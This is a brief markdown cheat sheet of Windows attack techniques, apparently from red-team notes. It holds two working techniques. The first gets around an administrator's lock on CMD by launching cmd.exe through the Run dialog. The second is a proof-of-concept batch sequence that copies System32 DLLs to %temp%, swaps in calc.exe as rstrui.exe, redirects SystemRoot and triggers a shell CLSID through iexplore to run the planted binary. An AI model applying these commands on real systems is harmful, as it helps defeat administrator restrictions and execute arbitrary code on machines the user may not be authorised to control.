# bypass CMD being locked down
if CMD is locked down by administrator
- open start menu
- open run
- run: ```cmd.exe /k "whoami"```



# Explorer LOLBAS
## POC:
```
mkdir %temp%\System32
FOR /R C:\Windows\System32\ %F IN (*.dll) DO COPY "%F" %temp%\System32\ /Y >NUL
set a=C:\Windows\System32\calc.exe
copy %a% %temp%\System32\rstrui.exe /Y > NUL
set SystemRoot=%temp%
start iexplore shell:::{3f6bc534-dfa1-4ab4-ae54-ef25a74e0107}****
```

### References: 
- https://twitter.com/notwhickey/status/1584774172906967042
- https://youtu.be/PuNgf29Gn8o
- https://strontic.github.io/xcyclopedia/library/clsid_3f6bc534-dfa1-4ab4-ae54-ef25a74e0107.html
- https://strontic.github.io/xcyclopedia/
- https://ss64.com/nt/shell.html
- https://winaero.com/windows-11-shell-commands-the-complete-list/
- https://www.winhelponline.com/blog/shell-commands-to-access-the-special-folders/
- https://learn.microsoft.com/en-us/windows/win32/com/embedded-objects
